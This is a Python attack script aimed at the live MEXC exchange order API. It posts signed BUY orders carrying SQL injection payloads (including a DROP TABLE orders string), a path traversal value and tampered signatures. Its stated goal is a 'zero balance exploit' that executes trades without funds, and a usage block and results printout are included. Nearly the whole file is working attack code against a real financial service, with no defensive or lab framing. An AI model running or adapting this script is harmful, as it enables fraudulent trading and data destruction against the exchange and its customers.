import hmac
import hashlib
import requests
import time
from urllib.parse import quote, urlencode

class MEXCDeepInjection:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        self.base_url = "https://api.mexc.com"
        
    def _generate_malicious_signature(self, params):
        """Generates signatures with injection points"""
        # Original signature
        query = urlencode(sorted(params.items()))
        real_sig = hmac.new(
            self.api_secret.encode(),
            query.encode(),
            hashlib.sha256
        ).hexdigest()
        
        # Malicious variants
        return {
            'null_byte': real_sig + '%00',
            'sql_comment': real_sig + "'--",
            'overflow': 'A'*1000,
            'real': real_sig
        }

    def test_zero_balance_exploit(self, symbol, qty, price):
        """Tests trade execution with no balance"""
        params = {
            'symbol': symbol.upper(),
            'side': 'BUY',
            'type': 'LIMIT',
            'quantity': str(qty),
            'price': str(price),
            'timestamp': int(time.time() * 1000),
            'recvWindow': 60000,
            # Hidden injection points
            'inject1': "' OR 1=1--",
            'inject2': "'; DROP TABLE orders--",
            'inject3': "../../../admin/orders"
        }
        
        results = {}
        for sig_type, signature in self._generate_malicious_signature(params).items():
            try:
                params['signature'] = signature
                response = requests.post(
                    f"{self.base_url}/api/v3/order",
                    params=params,
                    headers={'X-MEXC-APIKEY': self.api_key},
                    timeout=10
                )
                results[sig_type] = {
                    'status': response.status_code,
                    'response': response.json(),
                    'params_used': params.copy()
                }
            except Exception as e:
                results[sig_type] = {'error': str(e)}
        
        return results

# Usage
tester = MEXCDeepInjection("YOUR_API_KEY", "YOUR_API_SECRET")
results = tester.test_zero_balance_exploit("BTCUSDT", 0.01, 85000)

print("🔥 Deep Injection Results 🔥")
for test, data in results.items():
    print(f"\nTest: {test.upper()}")
    print(f"Status: {data.get('status', 'N/A')}")
    print(f"Response: {data.get('response', 'N/A')}")
